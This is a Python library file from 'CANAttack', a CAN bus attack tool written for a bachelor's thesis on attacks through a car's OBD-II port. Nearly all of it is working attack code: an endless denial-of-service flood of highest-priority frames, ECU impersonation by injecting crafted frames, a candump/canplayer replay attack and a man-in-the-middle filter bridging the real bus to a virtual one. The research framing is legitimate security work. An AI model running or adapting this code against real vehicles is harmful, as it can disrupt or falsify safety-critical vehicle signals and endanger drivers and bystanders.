"""
    CANAttack CAN Bus Attack-Software as part of my bachelor's thesis
    "Conception of a prototypical realization of selected attacks on the CAN bus via OBD-II".

    Library containing all the important functions for CANAttack.

    (c) Jannik Schmied, 2023
"""
import sys
from dataclasses import dataclass
from os import getcwd, listdir
from re import match
from shlex import split
from subprocess import Popen, PIPE
from sys import maxsize
from time import sleep 

from __version__ import __version__


# Compatibility Mode for non UNIX devices
COMPATIBILITY: bool = False
USE_PCAN: bool = False

# from OBDLink import *
from .PCAN import *

if COMPATIBILITY:
    from scapy.contrib.cansocket_python_can import CANSocket  # used for non can-utils devices
else:
    from scapy.contrib.cansocket_native import CANSocket

from scapy.layers.can import CAN
from scapy.sendrecv import bridge_and_sniff
from termcolor import colored

# Show extended error messages
DEBUG: bool = True

# Constants
VERSION = __version__
BASE_PATH: str = getcwd()
BAUDRATE = PCAN_BAUD_500K
DEFAULT_CHANNEL = PCAN_USBBUS1
DEFAULT_DUMP_TIME: int = 5
DEFAULT_FILTER_ID: int = 0x137
DEFAULT_FILTER_OPERATION: str = "="
DEFAULT_PACKET_COUNT: int = 1
FD_MODE: bool = False
HIGHEST_PRIORITY_ID: int = 0x001
MIN_ID: int = 0x001
MAX_ID: int = 0x7FF
DEFAULT_TIMEOUT: int = 0
MAX_INT: int = maxsize
MAX_ITERATIONS: int = 10
MIN_ITERATIONS: int = 1
MITM_FILTER = None
READY: bool = False
SILENT: bool = False
VALID_BITRATES: dict = {
                            "5": PCAN_BAUD_5K,
                            "10": PCAN_BAUD_10K,
                            "20": PCAN_BAUD_20K,
                            "33": PCAN_BAUD_33K,
                            "47": PCAN_BAUD_47K,
                            "50": PCAN_BAUD_50K,
                            "83": PCAN_BAUD_83K,
                            "95": PCAN_BAUD_95K,
                            "100": PCAN_BAUD_100K,
                            "125": PCAN_BAUD_125K,
                            "250": PCAN_BAUD_250K, 
                            "500": PCAN_BAUD_500K,
                            "800": PCAN_BAUD_800K,
                            "1000": PCAN_BAUD_1M
                        }

# Interfaces
CAN_INTERFACE: str = "can0"     # Real CAN Bus
MITM_INTERFACE: str = "vcan0"   # Virtual CAN Bus


@dataclass
class MessageColorIndex:
    """Color scheme for different messages"""
    ERROR = colored("[!]", "red", attrs=["bold"])
    INFO = colored("[i]", "blue", attrs=["bold"])
    PROMPT = colored("[?]", "blue", attrs=["bold"])
    STEP = colored("[*]", "green", attrs=["bold"])
    BOLD = lambda string: colored(string, attrs=['bold'])


class InvalidCanIdException(Exception):
    pass


class CANConnection:
    """Object managing CAN connection"""
    def __init__(self, socket: str, fd: bool = False, pcan: bool = False, baud_rate=BAUDRATE) -> None:
        self.ready = False
        self.pcan_mode = pcan
        self.fd_mode = fd
        self.baud_rate = baud_rate

        if self.pcan_mode:
            pcan = PCANBasic()

            if self.fd_mode:
                pcan.InitializeFD(BitrateFD=PCAN_BR_CLOCK, channel=DEFAULT_CHANNEL)
            else:
                pcan.Initialize(Btr0Btr1=self.baud_rate, channel=DEFAULT_CHANNEL)

            self.connection = pcan
        else:
            self.connection = CANSocket(channel=socket)

        self.ready = True

    def send(self, pkt) -> bool:
        """Send CAN message to socket"""
        if not self.ready:
            print(f"{MessageColorIndex.ERROR} Connection not ready.")
            return False

        try:
            if self.pcan_mode:
                if self.fd_mode:
                    self.connection.WriteFD(Channel=DEFAULT_CHANNEL, MessageBuffer=pkt)
                else:
                    self.connection.Write(Channel=DEFAULT_CHANNEL, MessageBuffer=pkt)
            else:
                self.connection.sr1(pkt)
        except Exception as _:
            print(f"{MessageColorIndex.ERROR} Error sending CAN Message")
            return False

        return True

    def block(self):
        """Block CAN Bus by rapidly sending high priority messages"""
        pkt = CAN(identifier=HIGHEST_PRIORITY_ID, data=b'bl0ck3d.')
        send_counter = 0

        while True:
            try:
                self.connection.send(pkt)
                send_counter += 1
            except KeyboardInterrupt:
                print(f"\n\n{MessageColorIndex.INFO} DoS-Attack stopped. (Interrupted by User)")
                print(f"{MessageColorIndex.INFO} Packets send: {send_counter}\n")
                sys.exit(1)

    def imitate(self, target: int, data: str, count: int = DEFAULT_PACKET_COUNT):
        """Data manipulation by imitating an ecu"""
        # Handle target
        try:
            target = int(target, 16)
            if target < MIN_ID or target > MAX_ID:
                raise InvalidCanIdException
        except InvalidCanIdException:
            print(f"{MessageColorIndex.ERROR} Invalid CAN ID.")
        except Exception as e:
            print(f"{MessageColorIndex.ERROR} Error converting target id to hex: {e}")

        # Handle data
        try:
            data = data.encode("utf-8")
        except Exception as e:
            print(f"{MessageColorIndex.ERROR} Error encoding data: {e}")
            sys.exit(1)

        if count > MAX_INT:
            print(f"{MessageColorIndex.ERROR} Error: count must not be bigger than {MAX_INT}.")
            count = MAX_INT

        # Build packet
        pkt = CAN(identifier=target, data=data)

        print(f"{MessageColorIndex.STEP} Crafted CAN Frame:")
        print(pkt.show())

        packet_counter: int = 0

        # Try sending packet
        try:
            for _ in range(count):
                self.send(pkt)
                packet_counter += 1
        except Exception as e:
            print(f"{MessageColorIndex.ERROR} Error sending CAN-Frame: {e}")
            sys.exit(1)

        print(f"\n{MessageColorIndex.STEP} Finished. Sent {packet_counter}/{count} packets.\n")
        sys.exit(0)


def has_root_permissions() -> bool:
    """Checks if script is executed with root permissions"""
    try:
        # Check for *nix systems
        from os import geteuid
        return geteuid() == 0
    except AttributeError:
        # Check for Windows systems
        import ctypes
        return ctypes.windll.shell32.IsUserAnAdmin() == 0


def is_valid_bitrate(bitrate: int) -> bool:
    """Checks if bitrate is valid"""
    return bitrate in VALID_BITRATES


def is_valid_com_port(com_port) -> bool:
    """Check if device name follows COM Port naming schema"""
    valid_com_pattern = r"^[C][O][M][0-9]{1,5}$"

    if match(valid_com_pattern, com_port):
        return True
    return False


def interface_is_up(interface: str) -> bool:
    """Check if network interface is up and running (*nix only)"""
    interface_path = f"/sys/class/net/{interface}"

    # Option 1
    # Interface is definitely up when flags & 0x1 is in /sys/class/net/<interface>/flags
    try:
        file = open(f"{interface_path}/flags")
    except FileExistsError:
        return False
    except FileNotFoundError:
        return False

    flag = file.read()
    file.close()
    flag = int(flag.replace('\n', ''), 16)

    if flag & 0x1:
        return True

    # Option 2
    # Interface is up when /sys/class/net/<interface>/operstate's content is "up"
    # Not 100% correct for wired connections because interface can be up tough cable is disconnected
    try:
        file = open(f"{interface_path}/operstate")
    except FileExistsError:
        return False
    except FileNotFoundError:
        return False

    flag = file.read()
    file.close()
    flag = flag.replace('\n', '')

    if flag == "up":
        return True

    return False


def is_valid_filter(input_filter) -> bool:
    """Checks if filter is in a valid format"""
    valid_filter_pattern = r'^[\s]*[\<|\>|\=|\*][\s]*[0][x][0-9a-fA-F]{3}[\s]*$'

    if match(valid_filter_pattern, input_filter):
        return True
    return False


def replay_traffic(target, dump_time: int, iterations: int = MIN_ITERATIONS):
    """Replay attack"""
    # Handle input
    if dump_time > MAX_INT or dump_time < 1:
        print(f"{MessageColorIndex.ERROR} The dump time you specified is out of range. Setting dump time to {DEFAULT_DUMP_TIME} s.")
        dump_time = DEFAULT_DUMP_TIME

    # Handle iteration count, must be [1, 10]
    if iterations < MIN_ITERATIONS:
        print(f"{MessageColorIndex.ERROR} Iteration count must not be smaller than {MIN_ITERATIONS}")
        iterations = MIN_ITERATIONS
    if iterations > MAX_ITERATIONS:
        print(f"{MessageColorIndex.ERROR} Iteration count must not be greater than {MAX_ITERATIONS}.")
        iterations = MAX_ITERATIONS

    print(f"{MessageColorIndex.STEP} Capturing packets...")

    # Build dump command
    dump = f"candump -l {target}"

    # Start dump
    proc = Popen(dump, shell=True)
    sleep(dump_time)

    # End dump
    proc.terminate()
    p = input(f"{MessageColorIndex.STEP} Dump finished. Start replay? (y/n) ")

    if p in ("Y", "y", "Yes", "yes"):
        # Get all captured logfiles
        files = listdir(BASE_PATH)
        file_counter = 0
        player = None
        logs = []
        for f in files:
            if match(r"candump*", f):
                logs.append(f)
                file_counter += 1

        if file_counter > 0:
            if iterations == 1:
                print(f"{MessageColorIndex.STEP} Start replaying...")
            else:
                print(f"{MessageColorIndex.STEP} Start replaying {iterations} times...")

            # Play latest log file
            try:
                command = "canplayer -I " + BASE_PATH + "/" + logs[-1]
                for _ in range(iterations):
                    player = Popen(split(command), stdout=PIPE, stderr=PIPE)
            except Exception as e:
                print(f"{MessageColorIndex.ERROR} Error: {e}")
                sys.exit(1)
            finally:
                print(f"{MessageColorIndex.STEP} Replay finished.\n")
                if player:
                    player.terminate()
        else:
            print(f"{MessageColorIndex.ERROR} Error: no log files found!")
            sys.exit(1)
    else:
        print(f"{MessageColorIndex.STEP} Dump saved, you can replay it manually later.\n")


######################
# MITM Filter Attack #
######################
class MITMFilter:
    """Filter for Man-in-the-Middle attack"""
    def __init__(self, mitm_filter: str):
        self.operation = "="
        self.content = ""
        self.set_filter(mitm_filter)

    def set_filter(self, input_filter: str):
        """Parse and set filter"""
        # Parse input
        try:
            operation, content = input_filter.split()
        except Exception as e:
            print(f"{MessageColorIndex.ERROR} Error parsing filter input: {e}.")

        # Convert ID
        try:
            content = int(content, 16)
        except Exception as e:
            print(f"{MessageColorIndex.ERROR} Error converting identifier: {e}. Using default filter ID ({DEFAULT_FILTER_ID}).")
            content = DEFAULT_FILTER_ID

        # Assign
        self.operation = operation
        self.content = content


def get_packet(pkt):
    operation = MITM_FILTER.operation
    content = MITM_FILTER.content

    # Execute
    if operation == "<":
        return pkt.identifier < content
    if operation == ">":
        return pkt.identifier > content
    if operation == "=":
        return pkt.identifier == content
    if operation == "*":
        return pkt.identifier


def mitm_filter_attack(mitm_if, timeout):
    """Man-in-the-Middle attack"""
    # If input is a valid number, go on, no timeout else
    try:
        timeout = int(timeout)
    except Exception as e:
        if timeout == "":
            print(f"{MessageColorIndex.STEP} No timeout set.")
        else:
            print(f"{MessageColorIndex.ERROR} Error: {e}. Setting timeout to {DEFAULT_TIMEOUT}.")
        timeout = DEFAULT_TIMEOUT

    if timeout > MAX_INT:
        timeout = MAX_INT

    try:
        if timeout == 0:
            print(f"{MessageColorIndex.STEP} Filtering, press Ctrl+C to stop...")
            bridge_and_sniff(if1=CAN_INTERFACE, if2=mitm_if, xfrm12=get_packet, xfrm21=get_packet)
        else:
            print(f"{MessageColorIndex.STEP} Filtering for {timeout} s")
            bridge_and_sniff(if1=CAN_INTERFACE, if2=mitm_if, xfrm12=get_packet, xfrm21=get_packet, timeout=timeout)
    except KeyboardInterrupt:
        print(f"{MessageColorIndex.INFO} Filtering stopped. (Interrupted by User)\n")
        sys.exit(1)
    except Exception as e:
        print(f"{MessageColorIndex.ERROR} Error running sniffer: {e}")
        sys.exit(1)
